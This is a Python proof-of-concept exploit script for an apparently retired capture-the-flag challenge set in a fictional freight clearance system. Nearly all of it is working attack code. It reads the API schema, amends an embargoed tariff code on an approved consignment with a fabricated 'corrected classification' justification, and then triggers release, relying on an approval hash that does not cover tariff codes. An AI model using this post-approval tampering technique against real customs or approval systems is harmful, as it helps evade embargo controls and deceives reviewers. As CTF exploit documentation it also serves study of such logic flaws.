#!/usr/bin/env python3
"""Orsvane Freight Clearance - proof of concept.

Summary: release trusts an approval manifest hash that does not cover HS
codes, so amending an embargoed tariff code post-approval still releases.

Usage: orsvane_clearance.py [BASE_URL] [CONSIGNMENT_ID]

The CTF instance is retired; this PoC documents the exploit path.
"""

import sys

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://<instance>"
CONSIGNMENT = sys.argv[2] if len(sys.argv) > 2 else "MFC-VPH7WKB"

EMBARGOED_HS = "8543.70"    # embargoed code seen on the held line item
REPLACEMENT_HS = "8409.99"  # non-embargoed code already used by another line item
JUSTIFICATION = "Corrected tariff classification following customs review."


def get_json(session, path):
    resp = session.get(f"{BASE}{path}", timeout=10)
    resp.raise_for_status()
    return resp.json()


def main():
    session = requests.Session()

    # Recon: /schema describes the API and the release checks.
    try:
        schema = get_json(session, "/schema")
        print(f"[schema] {schema}")
    except requests.RequestException as exc:
        print(f"[schema] unavailable: {exc}")

    details = get_json(session, f"/consignments/{CONSIGNMENT}")
    print(f"[consignment] approval={details.get('approval')} "
          f"manifest_hash={details.get('manifest_hash')} "
          f"current_manifest_hash={details.get('current_manifest_hash')}")

    # Pick the embargoed line item; fall back to line 0 as documented.
    items = details.get("line_items") or details.get("lineitems") or []
    target = next((i for i, item in enumerate(items)
                   if item.get("hs_code") == EMBARGOED_HS), 0)
    print(f"[amend] line item {target}: {EMBARGOED_HS} -> {REPLACEMENT_HS}")

    resp = session.patch(
        f"{BASE}/consignments/{CONSIGNMENT}/lineitems/{target}",
        json={"hs_code": REPLACEMENT_HS, "justification": JUSTIFICATION},
        timeout=10,
    )
    resp.raise_for_status()

    # hs_code is not covered by the approval hash, so the manifest stays valid.
    resp = session.post(f"{BASE}/consignments/{CONSIGNMENT}/release", timeout=10)
    resp.raise_for_status()
    print(f"[release] {resp.json()}")


if __name__ == "__main__":
    main()
